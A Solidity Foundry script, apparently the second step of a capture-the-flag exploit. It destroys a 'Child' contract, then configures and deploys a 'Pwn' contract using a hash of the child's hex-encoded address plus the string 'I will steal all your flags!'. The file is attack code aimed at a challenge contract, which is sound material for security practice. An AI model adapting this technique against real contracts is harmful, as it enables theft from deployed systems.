// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/Pwn.sol";

contract step2 is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Child c = Child(vm.envAddress("CHILD"));
        uint160 ad = uint160(address(c));
        bytes memory payload = new bytes(40);
        for (uint i = 0; i < 40; i++) {
            uint idx = 39 - i;
            uint8 b = uint8(ad & 0xf);
            ad >>= 4;
            if (b < 10) {
                payload[idx] = bytes1(0x30 + b);
            } else {
                payload[idx] = bytes1(0x60 - 9 + b);
            }
        }
        c.die();
        Pwn pwn = Pwn(vm.envAddress("PWN"));
        pwn.set(abi.encodePacked(sha256(abi.encodePacked(payload, "||I will steal all your flags!"))));
        pwn.deploy();
        vm.stopBroadcast();
    }
}
